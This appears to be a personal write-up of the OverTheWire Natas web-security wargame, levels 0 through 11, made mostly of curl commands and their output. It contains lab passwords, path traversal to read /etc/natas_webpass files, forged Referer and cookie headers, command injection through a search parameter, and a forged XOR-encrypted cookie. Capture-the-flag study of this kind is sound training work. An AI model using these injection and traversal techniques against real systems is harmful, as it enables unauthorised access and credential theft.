-- Natas Challenges --

# Level 0:
abs@MacBookPro ~ % curl http://natas0.natas.labs.overthewire.org -u natas0:natas0 -s | grep password
```
You can find the password for the next level on this page.
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```


# Level 0 -> 1:
abs@MacBookPro ~ % curl http://natas1.natas.labs.overthewire.org -u natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -s | grep pass
```
<script>var wechallinfo = { "level": "natas1", "pass": "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq" };</script></head>
You can find the password for the
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```


# Level 1 -> 2:
abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI      
```         
...
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org/files/ -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -s | grep href 
```
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="pixel.png">pixel.png</a></td><td align="right">2025-08-15 13:06  </td><td align="right">303 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-08-15 13:06  </td><td align="right">145 </td><td>&nbsp;</td></tr>
```

abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org/files/users.txt -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI 
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```


# Level 2 -> 3:
abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s            
```
...
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/robots.txt -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s 
```
User-agent: *
Disallow: /s3cr3t/
```

abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/s3cr3t/ -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s 
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /s3cr3t</title>
 </head>
 <body>
<h1>Index of /s3cr3t</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-08-15 13:06  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80</address>
</body></html>
```
abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s  
```
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```


# Level 3 -> 4:
abs@MacBookPro ~ % curl http://natas4.natas.labs.overthewire.org -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -s   
```
...
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

abs@MacBookPro ~ % curl natas4.natas.labs.overthewire.org/index.php -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H "Referer: http://natas5.natas.labs.overthewire.org/" -s
```
...
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

# Level 4 -> 5:
abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -s
```
...
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -i | grep Cookie
```
Set-Cookie: loggedin=0
```

abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -i -H "Cookie: loggedin=1" 
```
...
Set-Cookie: loggedin=1
...
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
```



# Level 5 -> 6:

abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s                                                                        
```
...
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org/includes/secret.inc -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s 
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

```
abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s -d "secret=FOEIUWGHFEEUHOFUOIU&submit=no_one_cares" | grep "Access granted"
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```


# Level 6 -> 7:
abs@MacBookPro ~ % curl natas7.natas.labs.overthewire.org -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS -s 
```
...
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

abs@MacBookPro ~ % curl "natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS -s
```
...
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```


# Level 7 -> 8:

abs@MacBookPro ~ % curl "natas8.natas.labs.overthewire.org/" -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -s
```
...
<h1>natas8</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html
```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

some calc:
```
bin2hex(strrev(base64_encode($secret))) = "3d3d516343746d4d6d6c315669563362"
strrev(base64_encode($secret)) = hex2bin("3d3d516343746d4d6d6c315669563362")
base64_encode($secret) = strrev(hex2bin("3d3d516343746d4d6d6c315669563362"))
$secret = base64_deccode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))
```


abs@MacBookPro ~ % python3 -c "import base64; h='3d3d516343746d4d6d6c315669563362'; print(base64.b64decode(bytes.fromhex(h)[::-1]))"
```
b'oubWYf2kBq'
```

abs@MacBookPro ~ % curl "natas8.natas.labs.overthewire.org/" -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -s -d "secret=oubWYf2kBq&submit=" | grep "Access granted"
```
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```


# Level 8 -> 9:
abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s                                                     
```
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s -d "needle=hello & submit="                           
```
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
hello
hello's
hellos
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

index-source.html:
```
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```


I would like to run something like: "grep -i . /etc/natas_webpass/natas" so...
abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s -d "needle=. /etc/natas_webpass/natas10; file  & submit="
```
Output:
<pre>
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
dictionary.txt: Unicode text, UTF-8 text
</pre>
```


# Level 9 -> 10:
abs@MacBookPro ~ % curl "natas10.natas.labs.overthewire.org/" -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -s                                                 
```
For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

index-source.html:
```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

lol this should be easy, I guess they want me to use cat or something the prev level..

abs@MacBookPro ~ % curl "natas10.natas.labs.overthewire.org/" -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -s -d "needle=. /etc/natas_webpass/natas11 --exclude  & submit="
```
Output:
<pre>
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
</pre>
```


# Level 10 -> 11:
abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -s                                                       
```
<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>


<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>
```

abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -i  | grep Cookie
```
Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJV3djTRg%3D
Cookies are protected with XOR encryption<br/><br/>
```


abs@MacBookPro ~ % echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))"
```            
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
```

array ^ key = data
key = array ^ data 


abs@MacBookPro ~ % echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" | base64 -d > data
abs@MacBookPro ~ % python3 -c 'import json; print(json.dumps({"showpassword":"no","bgcolor":"#ffffff"}))' > array                                                                
abs@MacBookPro ~ % python3 - <<'EOF'
a = open("data","rb").read()
b = open("array","rb").read()

print(bytes([x ^ b[i % len(b)] for i, x in enumerate(a)]))
EOF
```
b'eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```

So the key is "eDWo".
Thus, the new cookie value should be: "eDWo" ^ {"showpassword":"yes","bgcolor":"#ffffff"}
abs@MacBookPro ~ % python3 - <<'EOF'
a = '{"showpassword":"yes","bgcolor":"#ffffff"}'.encode()  # default UTF-8
b = "eDWo".encode()  # default UTF-8

res = bytes([x ^ b[i % len(b)] for i, x in enumerate(a)])
import base64

print(base64.b64encode(res).decode())
EOF
```
HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
```

abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -i -H "Cookie: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5" 
```
<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
```

# Level 11 -> 12:
# Level 12 -> 13:
# Level 13 -> 14:
# Level 14 -> 15:
# Level 15 -> 16:
# Level 16 -> 17:
# Level 17 -> 18:
# Level 18 -> 19:
# Level 19 -> 20:
# Level 20 -> 21:
# Level 21 -> 22:
# Level 22 -> 23:
# Level 23 -> 24:
# Level 24 -> 25:
# Level 25 -> 26:
# Level 26 -> 27:
# Level 27 -> 28:
# Level 28 -> 29:
# Level 29 -> 30:
# Level 30 -> 31:
# Level 31 -> 32:
# Level 32 -> 33:
# Level 33 -> 34: